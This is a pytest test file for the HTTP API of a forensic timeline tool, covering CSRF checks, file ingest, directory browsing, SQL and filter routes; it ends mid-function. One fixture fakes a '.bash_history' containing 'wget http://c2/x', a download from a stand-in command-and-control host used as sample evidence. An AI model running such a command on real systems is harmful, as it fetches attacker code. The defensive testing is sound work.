"""server.py HTTP layer: the CSRF middleware, and a risk-weighted slice of
routes that do real request-shape work beyond a thin Store pass-through
(most routes are exactly that, and are already covered by the Store-level
tests in the other files — this file's job is the HTTP wiring itself)."""

from __future__ import annotations

import io
import json


def test_csrf_middleware_blocks_post_without_header(store, monkeypatch):
    import server
    from fastapi.testclient import TestClient

    monkeypatch.setattr(server, "STORE", store)
    bare_client = TestClient(server.app)  # no X-Timeline-Lite-Client header by default
    r = bare_client.post("/api/tags", json={"name": "X", "color": "#000000"})
    assert r.status_code == 403


def test_static_assets_and_index_are_not_browser_cached(client):
    # No build step / content-hashed filenames to cache-bust with (see
    # CLAUDE.md) and these files change often during active development —
    # a stale style.css/app.js served from the browser's own disk cache
    # (StaticFiles sets ETag/Last-Modified but no Cache-Control on its own)
    # was a real, reproduced bug: a hard refresh "fixed" a layout issue
    # that the actual CSS on disk never had.
    for path in ("/", "/static/style.css", "/static/app.js", "/static/index.html"):
        r = client.get(path)
        assert r.headers.get("cache-control") == "no-cache", path
    # API routes are untouched — no reason to force revalidation on data.
    r = client.get("/api/sources")
    assert r.headers.get("cache-control") is None


def test_csrf_middleware_exempts_get(store, monkeypatch):
    import server
    from fastapi.testclient import TestClient

    monkeypatch.setattr(server, "STORE", store)
    bare_client = TestClient(server.app)   # no client header: the point of this test
    r = bare_client.get("/api/sources")
    assert r.status_code == 200


def test_csrf_middleware_allows_post_with_header(client):
    r = client.post("/api/tags", json={"name": "X", "color": "#000000"})
    assert r.status_code == 200


def test_ingest_upload_route(client):
    csv_bytes = b"A,B\n1,2\n3,4\n"
    r = client.post(
        "/api/ingest/upload",
        files={"file": ("up.csv", io.BytesIO(csv_bytes), "text/csv")},
        data={"build_fts": "false"},
    )
    assert r.status_code == 200
    body = r.json()
    assert body["row_count"] == 2
    assert [c["name"] for c in body["columns"]] == ["A", "B"]


def test_saved_filters_reorder_route(client):
    a = client.post("/api/saved_filters", json={"name": "A", "col_names": ["X"], "payload": {}}).json()
    b = client.post("/api/saved_filters", json={"name": "B", "col_names": ["X"], "payload": {}}).json()
    r = client.post("/api/saved_filters/reorder", json={"ids": [b["id"], a["id"]]})
    assert r.status_code == 200
    assert [f["name"] for f in r.json()] == ["B", "A"]


def test_saved_filter_update_route_takes_a_payload_edit(client):
    """The Filter builder's "Update" button re-saves conditions over an
    existing filter and deliberately omits col_names, so the filter stays
    bound to the header set it was saved for."""
    created = client.post("/api/saved_filters", json={
        "name": "Failed logons", "col_names": ["EventId"], "payload": {"search": "4625"},
    }).json()

    r = client.put(f"/api/saved_filters/{created['id']}", json={"payload": {"search": "4624"}})
    assert r.status_code == 200
    updated = r.json()
    assert updated["payload"] == {"search": "4624"}
    assert updated["name"] == "Failed logons"
    assert updated["col_names"] == ["EventId"]


def test_saved_filter_update_route_404s_unknown_id(client):
    r = client.put("/api/saved_filters/9999", json={"name": "nope"})
    assert r.status_code == 404


def test_ingest_sqlite_routes_preview_then_upload(client, tmp_path):
    import sqlite3

    path = tmp_path / "sample.sqlite"
    conn = sqlite3.connect(str(path))
    conn.execute("CREATE TABLE widgets (id INTEGER PRIMARY KEY, name TEXT)")
    conn.executemany("INSERT INTO widgets VALUES (?,?)", [(1, "a"), (2, "b")])
    conn.commit()
    conn.close()
    raw = path.read_bytes()

    r = client.post(
        "/api/ingest/sqlite/preview",
        files={"file": ("sample.sqlite", io.BytesIO(raw), "application/octet-stream")},
    )
    assert r.status_code == 200
    tables = {t["name"]: t for t in r.json()["tables"]}
    assert tables["widgets"]["row_count"] == 2

    r2 = client.post(
        "/api/ingest/sqlite/upload",
        files={"file": ("sample.sqlite", io.BytesIO(raw), "application/octet-stream")},
        data={"table": "widgets", "build_fts": "false"},
    )
    assert r2.status_code == 200
    body = r2.json()
    assert body["row_count"] == 2
    assert [c["name"] for c in body["columns"]] == ["id", "name"]


def test_ingest_json_routes_preview_then_upload(client):
    records = [
        {"id": 1, "user": {"name": "alice"}},
        {"id": 2, "user": {"name": "bob"}},
    ]
    raw = json.dumps(records).encode()

    r = client.post(
        "/api/ingest/json/preview",
        files={"file": ("data.json", io.BytesIO(raw), "application/json")},
        data={"flatten_mode": "full"},
    )
    assert r.status_code == 200
    body = r.json()
    assert body["record_count"] == 2
    assert body["columns"] == ["id", "user.name"]

    r2 = client.post(
        "/api/ingest/json/upload",
        files={"file": ("data.json", io.BytesIO(raw), "application/json")},
        data={"flatten_mode": "full", "build_fts": "false"},
    )
    assert r2.status_code == 200
    body2 = r2.json()
    assert body2["row_count"] == 2
    assert [c["name"] for c in body2["columns"]] == ["id", "user.name"]


def test_ingest_jsonl_route_via_extension(client):
    records = [{"id": 1}, {"id": 2}, {"id": 3}]
    raw = "\n".join(json.dumps(r) for r in records).encode()
    r = client.post(
        "/api/ingest/json/upload",
        files={"file": ("data.jsonl", io.BytesIO(raw), "application/x-ndjson")},
        data={"build_fts": "false"},
    )
    assert r.status_code == 200
    assert r.json()["row_count"] == 3


def test_browse_dir_lists_subdirectories(client, tmp_path):
    (tmp_path / "sub_b").mkdir()
    (tmp_path / "sub_a").mkdir()
    (tmp_path / ".hidden").mkdir()
    (tmp_path / "not_a_dir.txt").write_text("x")

    r = client.get(f"/api/browse_dir?path={tmp_path}")
    assert r.status_code == 200
    body = r.json()
    assert body["dirs"] == ["sub_a", "sub_b"]  # sorted, dotfiles/files excluded
    assert body["parent"] == str(tmp_path.parent)


def test_browse_dir_files_mode_lists_everything_with_sizes(client, tmp_path):
    """The import modal's "Add from this machine…" picker: files come back
    with sizes, capped, and deliberately unfiltered — not by extension
    (importability is the frontend's call) and not by dot prefix (on a
    mounted *nix image, .bash_history IS the evidence). The folder-mode
    callers don't ask and keep the old shape, cosmetic dot filter included."""
    root = tmp_path / "browse"
    root.mkdir()
    (root / "evidence.csv").write_text("A,B\n1,2\n")
    (root / ".bash_history").write_text("wget http://c2/x\n")
    (root / ".ssh").mkdir()
    (root / "sub").mkdir()

    plain = client.get(f"/api/browse_dir?path={root}").json()
    assert plain["dirs"] == ["sub"] and "files" not in plain

    r = client.get(f"/api/browse_dir?path={root}&files=true").json()
    assert r["dirs"] == [".ssh", "sub"]
    assert {f["name"] for f in r["files"]} == {"evidence.csv", ".bash_history"}
    assert next(f for f in r["files"] if f["name"] == "evidence.csv")["size"] == 8
    assert r["truncated"] is False
    assert r["limit"] > 0


def test_browse_dir_files_mode_stats_a_typed_file_path(client, tmp_path):
    """The picker's typed-path box hands its text straight here: a path that
    names a file answers {picked} instead of 400, resolved by os.path on the
    server — which is what makes a pasted path work past the listing cap
    and regardless of separator style."""
    root = tmp_path / "browse2"
    root.mkdir()
    f = root / "huge.csv"
    f.write_text("A\n" * 10)
    r = client.get(f"/api/browse_dir?path={f}&files=true").json()
    assert r["picked"] == {"name": "huge.csv", "size": 20}
    assert r["path"] == str(root)


def test_browse_dir_files_mode_is_loopback_only(client, tmp_path, monkeypatch):
    """Folder listing has always answered any peer the analyst chose to
    bind, but disk-wide filename+size enumeration is gated to this machine
    — the same stance the removed resolve_local route took."""
    import server

    monkeypatch.setattr(server, "_is_loopback", lambda request: False)
    r = client.get(f"/api/browse_dir?path={tmp_path}&files=true")
    assert r.status_code == 403
    # folder mode is unchanged for the same peer
    assert client.get(f"/api/browse_dir?path={tmp_path}").status_code == 200


def test_browse_dir_rejects_non_directory(client, tmp_path):
    f = tmp_path / "not_a_dir.txt"
    f.write_text("x")
    r = client.get(f"/api/browse_dir?path={f}")
    assert r.status_code == 400


def test_case_open_migrates_legacy_presets_into_saved_filters(client, store, case_path):
    # Simulate a case file saved before presets were folded into saved
    # filters — a row straight in filter_presets, the old case-scoped table.
    with store.lock, store.db:
        store.db.execute(
            "INSERT INTO filter_presets(name, col_sig, col_names, payload, created_at) VALUES (?,?,?,?,?)",
            ("Legacy preset", "sig", json.dumps(["A", "B"]), json.dumps({"search": "x"}), "2024-01-01T00:00:00"),
        )
    store.close()  # release the file so /api/case/open can open its own connection

    r = client.post("/api/case/open", json={"path": case_path})
    assert r.status_code == 200

    from winnow import workspace as WS
    migrated = next((f for f in WS.filters.list() if f["name"] == "Legacy preset"), None)
    assert migrated is not None
    assert migrated["col_names"] == ["A", "B"]
    assert migrated["payload"] == {"search": "x"}

    # One-time: the legacy table is now empty, so re-opening again doesn't
    # duplicate the migrated filter.
    r2 = client.post("/api/case/open", json={"path": case_path})
    assert r2.status_code == 200
    assert len([f for f in WS.filters.list() if f["name"] == "Legacy preset"]) == 1


def test_rows_route_returns_409_after_view_expires(client, ingested):
    store, source_id = ingested
    view = store.build_view(source_id, {"source_id": source_id, "filters": [], "sort": []})
    store.close_view(view["view_id"])
    r = client.get(f"/api/rows?view_id={view['view_id']}&start=0&count=10")
    assert r.status_code == 409


def test_group_summary_route_accepts_json_encoded_path(client, store, write_csv):
    p = write_csv([["Host", "User"], ["H1", "a"], ["H1", "b"], ["H2", "a"]])
    rec = store.ingest_csv(p, name="g.csv", build_fts=False)
    view = store.build_view(rec["id"], {"source_id": rec["id"], "filters": [], "sort": []})

    r = client.get(f"/api/group_summary?view_id={view['view_id']}&column=Host")
    assert r.status_code == 200
    assert {g["value"]: g["count"] for g in r.json()["groups"]} == {"H1": 2, "H2": 1}

    path_param = json.dumps([{"column": "Host", "value": "H1"}])
    r2 = client.get(f"/api/group_summary?view_id={view['view_id']}&column=User&path={path_param}")
    assert r2.status_code == 200
    assert {g["value"]: g["count"] for g in r2.json()["groups"]} == {"a": 1, "b": 1}


def test_group_summary_route_passes_bucket_datetime_through(client, store, write_csv):
    """The value-picker dropdown's query string, end to end: same route, one
    flag, raw timestamps instead of day buckets."""
    p = write_csv([["When", "Host"],
                   ["2024-01-05 13:22:01", "H1"],
                   ["2024-01-05 19:04:00", "H2"]])
    rec = store.ingest_csv(p, name="ts.csv", build_fts=False)
    view = store.build_view(rec["id"], {"source_id": rec["id"], "filters": [], "sort": []})

    bucketed = client.get(f"/api/group_summary?view_id={view['view_id']}&column=When")
    assert [g["value"] for g in bucketed.json()["groups"]] == ["2024-01-05"]

    raw = client.get(f"/api/group_summary?view_id={view['view_id']}&column=When"
                     f"&order=value&bucket_datetime=false")
    assert [g["value"] for g in raw.json()["groups"]] == ["2024-01-05 13:22:01", "2024-01-05 19:04:00"]


def test_column_layouts_find_and_save_routes(client):
    empty = client.get("/api/column_layouts/find?col_names=A&col_names=B")
    assert empty.status_code == 200
    assert empty.json() == {}

    saved = client.post("/api/column_layouts", json={
        "col_names": ["A", "B"], "order": ["B", "A"], "columns": {},
    })
    assert saved.status_code == 200

    found = client.get("/api/column_layouts/find?col_names=B&col_names=A")
    assert found.json()["order"] == ["B", "A"]


def test_search_all_route_with_terms(client, store, write_csv):
    p = write_csv([["Process"], ["svchost.exe"], ["cmd.exe"]])
    store.ingest_csv(p, name="s.csv")
    r = client.post("/api/search_all", json={"terms": [{"term": "svchost.exe", "connector": "AND", "exclude": False}]})
    assert r.status_code == 200
    hits = r.json()
    assert len(hits) == 1
    assert hits[0]["match_count"] == 1


def test_search_all_job_routes(client, store, write_csv):
    """The start route returns immediately with a job id; the poll route
    reports progress and, once done, the same hits the sync route gives."""
    p = write_csv([["Process"], ["svchost.exe"], ["cmd.exe"]])
    store.ingest_csv(p, name="s.csv")

    started = client.post("/api/search_all/start", json={"terms": [
        {"term": "svchost.exe", "connector": "AND", "exclude": False},
    ]})
    assert started.status_code == 200
    job_id = started.json()["job_id"]

    store.wait_for_search_all_job(timeout=10)
    polled = client.get(f"/api/search_all/job?job_id={job_id}")
    assert polled.status_code == 200
    body = polled.json()
    assert body["done"] is True
    assert len(body["hits"]) == 1
    assert body["hits"][0]["match_count"] == 1
    assert body["scanned"] == body["total"] == 1


def test_search_all_job_route_404s_a_superseded_job(client, store, write_csv):
    """The poller has to be able to tell "this job is gone" from "no matches"
    — a stale poller must stop rather than render an empty result set."""
    store.ingest_csv(write_csv([["Process"], ["svchost.exe"]]), name="s.csv")
    first = client.post("/api/search_all/start", json={"query": "svchost"}).json()
    client.post("/api/search_all/start", json={"query": "cmd"})
    store.wait_for_search_all_job(timeout=10)

    assert client.get(f"/api/search_all/job?job_id={first['job_id']}").status_code == 404


def test_search_all_cancel_route(client, store, write_csv):
    store.ingest_csv(write_csv([["Process"], ["svchost.exe"]]), name="s.csv")
    started = client.post("/api/search_all/start", json={"query": "svchost"}).json()
    r = client.post(f"/api/search_all/cancel?job_id={started['job_id']}")
    assert r.status_code == 200
    assert r.json()["cancelled"] is True
    store.wait_for_search_all_job(timeout=10)


def test_sql_route_blocks_forbidden_statement(client, ingested):
    r = client.post("/api/sql", json={"sql": "PRAGMA table_info(sources)"})
    assert r.status_code == 400


def test_sql_route_runs_select(client, ingested):
    store, source_id = ingested
    r = client.post("/api/sql", json={"sql": f"SELECT count(*) AS n FROM src_{source_id}"})
    assert r.status_code == 200
    assert r.json()["rows"] == [[4]]


_SEVEN_THOUSAND = ("WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM n WHERE i < 7000) "
                   "SELECT i FROM n")


def test_sql_route_honours_an_explicit_limit(client, ingested):
    """winnow.api.sql (plugins) sends one; the pane uses /api/sql/run."""
    r = client.post("/api/sql", json={"sql": _SEVEN_THOUSAND, "limit": 5000})
    assert len(r.json()["rows"]) == 5000
    assert r.json()["truncated"] is True


def test_sql_route_still_returns_a_blob_as_text(client, ingested):
    """The fast JSONResponse path can't encode bytes; such a result falls
    back to FastAPI's encoder, which is what returned it before."""
    r = client.post("/api/sql", json={"sql": "SELECT CAST('abc' AS BLOB) AS b"})
    assert r.status_code == 200
    assert r.json()["rows"] == [["abc"]]


def test_view_route_400s_an_analyst_fixable_filter_error(client, ingested):
    _, source_id = ingested
    r = client.post("/api/view", json={
        "source_id": source_id,
        "filter_tree": {"type": "group", "op": "AND", "children": [
            {"type": "raw", "sql": "SELECT 1"},
        ]},
    })
    assert r.status_code == 400
    assert "SELECT" in r.json()["detail"]


def test_view_route_500s_an_internal_defect(client, ingested, monkeypatch):
    """A bug in here used to surface as `400 Filter error: ...`, blaming the
    analyst's filter for something they can't fix and hiding a real defect.
    Only ValueError/KeyError (bad fragment, unknown column, missing source)
    are 400s now."""
    import server
    from fastapi.testclient import TestClient

    store, source_id = ingested

    def boom(*a, **kw):
        raise RuntimeError("kaboom")

    monkeypatch.setattr(store, "build_view", boom)
    # raise_server_exceptions=False so the unhandled error comes back as a
    # 500 response rather than being re-raised into the test.
    lenient = TestClient(server.app, headers={"X-Timeline-Lite-Client": "1"},
                         raise_server_exceptions=False)
    r = lenient.post("/api/view", json={"source_id": source_id})
    assert r.status_code == 500


def test_view_route_404_style_missing_source_is_still_a_400(client):
    r = client.post("/api/view", json={"source_id": 9999})
    assert r.status_code == 400


def test_a_read_for_a_removed_table_is_a_404_not_a_500(client, ingested):
    """A request still in flight for a table another window just removed:
    the store says KeyError("No table N"), and the catch-all turned that
    into a 500 "Internal error" — an error badge, and an uncaught rejection
    in whichever click handler asked."""
    r = client.get("/api/tags?source_id=9999")
    assert r.status_code == 404
    assert "no longer in this case" in r.json()["detail"]
    assert client.get("/api/tags?source_id=-9999").status_code == 404   # a merge, same answer


def test_any_other_key_error_is_still_a_500(client, ingested, monkeypatch):
    import server
    from fastapi.testclient import TestClient

    store, source_id = ingested

    def boom(*a, **kw):
        raise KeyError("No table 1 because of a bug")   # close, but not the lookup's own words

    monkeypatch.setattr(store, "tag_counts", boom)
    lenient = TestClient(server.app, headers={"X-Timeline-Lite-Client": "1"},
                         raise_server_exceptions=False)
    assert lenient.get(f"/api/tags?source_id={source_id}").status_code == 500
    monkeypatch.setattr(store, "tag_counts", lambda *a, **kw: (_ for _ in ()).throw(KeyError(3)))
    assert lenient.get(f"/api/tags?source_id={source_id}").status_code == 500


def test_column_index_routes_list_and_drop(client, ingested):
    store, source_id = ingested
    assert client.get(f"/api/column_indexes?source_id={source_id}").json() == []
    client.get(f"/api/column_values?source_id={source_id}&column=Process")
    assert store.wait_for_column_index(source_id, "Process", timeout=5)
    listed = client.get(f"/api/column_indexes?source_id={source_id}").json()
    assert [ix["column"] for ix in listed] == ["Process"]

    r = client.delete(f"/api/column_indexes?source_id={source_id}&column=Process")
    assert r.status_code == 200
    assert client.get(f"/api/column_indexes?source_id={source_id}").json() == []

    assert client.delete(f"/api/column_indexes?source_id={source_id}&column=Nope").status_code == 404


def test_compact_route_reports_sizes(client, ingested):
    r = client.post("/api/case/compact")
    assert r.status_code == 200
    body = r.json()
    assert body["before_bytes"] > 0
    assert body["reclaimed_bytes"] == max(0, body["before_bytes"] - body["after_bytes"])


def test_compact_route_400s_when_disk_is_full(client, ingested, monkeypatch):
    import shutil as shutil_module

    from winnow import store as store_module

    fake = shutil_module.disk_usage(".")._replace(free=1024)
    monkeypatch.setattr(store_module.shutil, "disk_usage", lambda _p: fake)
    r = client.post("/api/case/compact")
    assert r.status_code == 400
    assert "free disk space" in r.json()["detail"]


def test_row_tags_view_route_passes_exclusions_through(client, ingested):
    store, source_id = ingested
    tag = client.post("/api/tags", json={"name": "Bulk", "color": "#123456"}).json()
    view = client.post("/api/view", json={"source_id": source_id}).json()
    r = client.post("/api/row_tags/view", json={
        "view_id": view["view_id"], "tag_id": tag["id"], "on": True,
        "exclude": [[source_id, 1]],
    })
    assert r.status_code == 200
    assert r.json()["affected"] == 3
    tagged = {row[0] for row in store.db.execute(
        "SELECT rid FROM row_tags WHERE source_id=? AND tag_id=?", (source_id, tag["id"]))}
    assert tagged == {2, 3, 4}


def test_request_against_closed_store_is_409_not_500(client, ingested):
    """A request that reaches a Store whose connection was closed (a case
    switch landed mid-flight — seen for real with several browsers on one
    --host 0.0.0.0 server) must come back as a clean 409 'case closed'
    rather than an unhandled sqlite3.ProgrammingError traceback. The
    message deliberately avoids the word 'expired': app.js auto-rebuilds
    on 409s that contain it, and a stale tab auto-rebuilding against a
    newly opened case could show the wrong case's data."""
    store, source_id = ingested
    store.close()
    r = client.post("/api/view", json={"source_id": source_id})
    assert r.status_code == 409
    detail = r.json()["detail"]
    assert "closed" in detail
    assert "expired" not in detail.lower()
    # GET endpoints go through the same handler
    r = client.get("/api/sources")
    assert r.status_code == 409


def test_case_open_failure_keeps_current_case_usable(client, ingested, tmp_path):
    """Opening a bad case file must not tear down the one that's open:
    the old close-then-open order left STORE pointing at a closed
    connection whenever the open failed."""
    bad = tmp_path / "not_a_case.db"
    bad.write_text("this is not a sqlite database, not even close")
    r = client.post("/api/case/open", json={"path": str(bad)})
    assert r.status_code == 400
    # the previously-open case must still answer
    r = client.get("/api/sources")
    assert r.status_code == 200
    assert len(r.json()) == 1


def test_derived_column_routes_end_to_end(client, store, write_csv):
    """The add → poll → list → delete cycle over HTTP, including the
    400-vs-404 split api_view established (a bad request is the analyst's
    to fix; a missing id isn't the same thing)."""
    p = write_csv([["Epoch"], ["1700000000"], ["1700000060"]], name="e.csv")
    sid = store.ingest_csv(p, name="e.csv", build_fts=False)["id"]

    ops = client.get("/api/derived/ops").json()
    assert "unix_epoch" in [o["id"] for o in ops]

    detected = client.post("/api/derived/detect", json={"source_id": sid, "column": "Epoch"}).json()
    assert detected[0]["op_id"] == "unix_epoch"

    preview = client.post("/api/derived/preview", json={
        "source_id": sid, "column": "Epoch", "op_id": "unix_epoch", "params": {},
    }).json()
    assert preview["failures"] == 0
    assert preview["preview"][0]["output"] == "2023-11-14 22:13:20"

    created = client.post("/api/derived", json={
        "source_id": sid, "name": "When", "input_column": "Epoch", "op_id": "unix_epoch",
    })
    assert created.status_code == 200
    def_id = created.json()["definition"]["id"]
    store.wait_for_ingest_job(created.json()["job_id"], timeout=30)

    listed = client.get(f"/api/derived?source_id={sid}").json()
    assert [d["name"] for d in listed] == ["When"]
    assert listed[0]["status"] == "ready"

    frag = client.get(f"/api/derived/{def_id}/unparsed_filter").json()["sql"]
    assert '"When" IS NULL' in frag

    dup = client.post("/api/derived", json={
        "source_id": sid, "name": "When", "input_column": "Epoch", "op_id": "unix_epoch",
    })
    assert dup.status_code == 400  # name collision is the analyst's to fix

    assert client.delete("/api/derived/99999").status_code == 404
    assert client.delete(f"/api/derived/{def_id}").status_code == 200
    assert client.get(f"/api/derived?source_id={sid}").json() == []


def test_derived_rederive_and_suggestion_routes(client, store, write_csv):
    p = write_csv([["When"], ["Dec 31 23:59:59"], ["Jan  1 00:00:01"]], name="sys.csv")
    sid = store.ingest_csv(p, name="sys.csv", build_fts=False)["id"]

    suggestions = client.get(f"/api/derived/suggestions?source_id={sid}").json()
    assert suggestions[0]["column"] == "When" and suggestions[0]["op_id"] == "syslog_bsd"

    created = client.post("/api/derived", json={
        "source_id": sid, "name": "Time", "input_column": "When", "op_id": "syslog_bsd",
        "params": {"base_year": 2023},
    })
    def_id = created.json()["definition"]["id"]
    store.wait_for_ingest_job(created.json()["job_id"], timeout=30)

    re_ = client.post(f"/api/derived/{def_id}/rederive", json={"params": {"base_year": 2020}})
    assert re_.status_code == 200
    store.wait_for_ingest_job(re_.json()["job_id"], timeout=30)
    assert store.get_derived_column(def_id)["params"] == {"base_year": 2020}

    # A required param that's missing is a 400, not a 500.
    bad = client.post("/api/derived", json={
        "source_id": sid, "name": "T2", "input_column": "When", "op_id": "syslog_bsd",
    })
    assert bad.status_code == 400


def test_derived_detect_and_suggestions_survive_a_value_that_raises(client, store, write_csv, monkeypatch):
    """Detect, suggestions and preview run every parser over real values;
    one that raised used to make each of them a 500 for the whole table.
    Here: an ISO stamp with an offset no clock has among epoch seconds,
    and a registered op (as a plugin's could be) that raises on every
    value. Both read as values that do not parse."""
    from winnow import timeparse

    def parse(value, params, state):
        raise RuntimeError("not this one")

    op = {"id": "t_always_raises", "label": "Always raises", "parse": parse}
    monkeypatch.setitem(timeparse.OPERATIONS, op["id"], op)
    timeparse.register_op(op)

    rows = [["Epoch", "Note"]] + [[str(1700000000 + i), "x"] for i in range(50)]
    rows.append(["2024-01-05T13:22:01+15:00", "x"])
    sid = store.ingest_csv(write_csv(rows, name="hostile.csv"), name="hostile.csv", build_fts=False)["id"]

    r = client.post("/api/derived/detect", json={"source_id": sid, "column": "Epoch"})
    assert r.status_code == 200, r.text
    assert r.json()[0]["op_id"] == "unix_epoch"
    assert "t_always_raises" not in [x["op_id"] for x in r.json()]

    r = client.get(f"/api/derived/suggestions?source_id={sid}")
    assert r.status_code == 200, r.text
    assert [x["column"] for x in r.json()] == ["Epoch"]

    r = client.post("/api/derived/preview", json={
        "source_id": sid, "column": "Epoch", "op_id": "iso8601", "params": {}})
    assert r.status_code == 200, r.text
    assert r.json()["failures"] == r.json()["sampled"] == 51

    r = client.post("/api/derived/preview", json={
        "source_id": sid, "column": "Epoch", "op_id": "t_always_raises", "params": {}})
    assert r.status_code == 200, r.text
    assert r.json()["failures"] == 51
    assert {x["output"] for x in r.json()["preview"]} == {None}


def test_timestamp_format_settings_routes(client):
    assert client.get("/api/settings/app").json()["default_ts_format"] == "iso"
    assert client.post("/api/settings/app", json={"default_ts_format": "us"}).status_code == 200
    assert client.get("/api/settings/app").json()["default_ts_format"] == "us"
    assert client.post("/api/settings/app", json={"default_ts_format": "klingon"}).status_code == 400

    assert client.get("/api/case_settings").json() == {}
    assert client.post("/api/case_settings", json={"ts_format": "date"}).status_code == 200
    assert client.get("/api/case_settings").json()["ts_format"] == "date"
    # Blank clears the case override rather than pinning the current value.
    client.post("/api/case_settings", json={"ts_format": ""})
    assert client.get("/api/case_settings").json() == {}


def test_view_sql_find_ts_and_tag_bounds_routes(client, ingested):
    """The three view-tool routes: spec→SQL rendering, jump-to-timestamp
    (409 on an expired view, same contract as /api/rows), and
    timeframe-from-tags."""
    store, sid = ingested

    r = client.post("/api/view/sql", json={"source_id": sid, "search": "svchost"})
    assert r.status_code == 200 and "FROM" in r.json()["sql"]
    assert client.post("/api/view/sql", json={"source_id": 999}).status_code == 400

    view = client.post("/api/view", json={"source_id": sid}).json()
    r = client.post("/api/view/find_ts", json={"view_id": view["view_id"], "value": "2024-01-05 13:22:30"})
    assert r.status_code == 200 and r.json()["rid"] == 1
    assert client.post("/api/view/find_ts", json={"view_id": view["view_id"], "value": "junk"}).status_code == 400
    assert client.post("/api/view/find_ts", json={"view_id": "view_999", "value": "2024-01-05 10:00:00"}).status_code == 409

    tag = store.list_tags()[0]["id"]
    store.set_tags(sid, [2], tag, True)
    r = client.post("/api/tag_time_bounds", json={"source_id": sid})
    assert r.json() == {"start": "2024-01-05 13:23:11", "end": "2024-01-05 13:23:11"}
    r = client.post("/api/tag_time_bounds", json={"source_id": sid, "tag_ids": [9999]})
    assert r.json() == {"start": None, "end": None}


def test_shutdown_route_triggers_and_responds(client, monkeypatch):
    """POST /api/shutdown answers before the process dies (the UI needs the
    200 to show its farewell page) and goes through _trigger_shutdown —
    monkeypatched here, since the real one raises SIGINT at pytest."""
    import server

    fired = []
    monkeypatch.setattr(server, "_trigger_shutdown", lambda: fired.append(True))
    r = client.post("/api/shutdown", json={})
    assert r.status_code == 200 and r.json() == {"ok": True}
    assert fired == [True]

    # CSRF gate still applies — a hostile page in another tab must not be
    # able to turn the server off with a bare fetch().
    from fastapi.testclient import TestClient
    bare = TestClient(server.app)
    assert bare.post("/api/shutdown", json={}).status_code == 403


def test_prefs_round_trip_and_first_run_flag(client, tmp_path):
    out = client.get("/api/prefs").json()
    assert "cases_dir" in out and "first_run" in out
    r = client.post("/api/prefs", json={"cases_dir": str(tmp_path / "mycases")})
    assert r.status_code == 200
    got = r.json()
    assert got["cases_dir"].endswith("mycases")
    assert got["first_run"] is False  # configured — never asked again
    assert (tmp_path / "mycases").is_dir()  # created eagerly so the browse works


def test_the_default_cases_folder_is_the_install_s_not_the_working_directory(
        client, tmp_path, monkeypatch):
    """First run's "Use the default" stored abspath('cases') — the folder
    the server happened to be started from, so `python /opt/winnow/
    server.py` run from a home directory filed every case under ~/cases.
    The default is cases/ in the install root, the prompt names it, and
    'cases' from an older page lands there too."""
    from winnow import paths

    install = tmp_path / "install"
    install.mkdir()
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    monkeypatch.setattr(paths, "INSTALL_ROOT", install)
    monkeypatch.chdir(elsewhere)

    prefs = client.get("/api/prefs").json()
    assert prefs["first_run"] is True
    got = client.post("/api/prefs", json={"cases_dir": "cases"}).json()
    assert got["cases_dir"] == str(install / "cases")
    assert (install / "cases").is_dir() and not (elsewhere / "cases").exists()
    # What the prompt shows is what it stores.
    assert prefs["default_cases_dir"] == str(install / "cases")
    got = client.post("/api/prefs", json={"cases_dir": prefs["default_cases_dir"]}).json()
    assert got["cases_dir"] == str(install / "cases")


def test_updates_rollback_route_maps_success_and_failure(client, monkeypatch):
    """The HTTP layer over updater.rollback — the module itself is tested
    in test_updater.py, but this route had no coverage at all, and it's
    the button an analyst reaches for when an update just broke the UI."""
    import server

    monkeypatch.setattr(server.updater, "rollback",
                        lambda root: {"restored_from": "backup-0.1.0"})
    r = client.post("/api/updates/rollback", json={})
    assert r.status_code == 200
    body = r.json()
    assert body["restored_from"] == "backup-0.1.0"
    assert body["restart_required"] is True   # the UI must say "restart now"

    def boom(root):
        raise server.updater.UpdateError("No backup to roll back to")
    monkeypatch.setattr(server.updater, "rollback", boom)
    r = client.post("/api/updates/rollback", json={})
    assert r.status_code == 400
    assert "No backup" in r.json()["detail"]


def test_remote_session_is_a_machine_setting(client):
    """Moved out of localStorage deliberately: browser storage is
    per-profile AND per-origin, so update restarts and association
    quick-looks (random ports) kept silently resetting it."""
    assert client.get("/api/settings/app").json()["remote_session"] is False
    r = client.post("/api/settings/app", json={"remote_session": 1})
    assert r.status_code == 200
    assert r.json()["remote_session"] is True   # coerced to a real bool
    assert client.get("/api/settings/app").json()["remote_session"] is True
    client.post("/api/settings/app", json={"remote_session": False})
    assert client.get("/api/settings/app").json()["remote_session"] is False


def test_the_page_arrives_already_in_remote_session_mode(client):
    """The launch animation decides whether to play before boot() has
    fetched the machine settings, so it can only honour the mode if the
    page itself already says so."""
    page = client.get("/")
    assert page.status_code == 200 and page.headers["cache-control"] == "no-cache"
    assert '<html lang="en"' in page.text
    client.post("/api/settings/app", json={"remote_session": True})
    assert '<html class="remote" lang="en"' in client.get("/").text
    client.post("/api/settings/app", json={"remote_session": False})
    assert 'class="remote"' not in client.get("/").text


# ---------------------------------------------------------------- folders

def test_folder_routes_crud_and_source_assignment(client, store, write_csv):
    # create → list
    a = client.post("/api/folders", json={"name": "Registry"}).json()
    b = client.post("/api/folders", json={"name": "Users", "parent_id": a["id"]}).json()
    assert {f["id"] for f in client.get("/api/folders").json()} == {a["id"], b["id"]}

    # rename + move + reorder
    assert client.post(f"/api/folders/{b['id']}/rename", json={"name": "Accounts"}).status_code == 200
    c = client.post("/api/folders", json={"name": "Logs"}).json()
    assert client.post("/api/folders/reorder",
                       json={"parent_id": None, "ordered_ids": [c["id"], a["id"]]}).status_code == 200
    assert client.post(f"/api/folders/{c['id']}/move",
                       json={"parent_id": a["id"]}).status_code == 200

    # assign a table, then read it back on /api/sources
    rid = store.ingest_csv(write_csv([["A"], ["1"]], "evt.csv"), name="evt.csv", build_fts=False)["id"]
    assert client.post(f"/api/source/{rid}/folder", json={"folder_id": a["id"]}).status_code == 200
    src = next(s for s in client.get("/api/sources").json() if s["id"] == rid)
    assert src["folder_id"] == a["id"]

    # delete is non-destructive to the source
    assert client.delete(f"/api/folders/{a['id']}").status_code == 200
    assert a["id"] not in {f["id"] for f in client.get("/api/folders").json()}
    src = next(s for s in client.get("/api/sources").json() if s["id"] == rid)
    assert src["folder_id"] is None            # a was top-level → table drops to root


def test_folder_create_rejects_blank_name(client):
    assert client.post("/api/folders", json={"name": "   "}).status_code == 400


def test_folder_move_cycle_is_rejected(client):
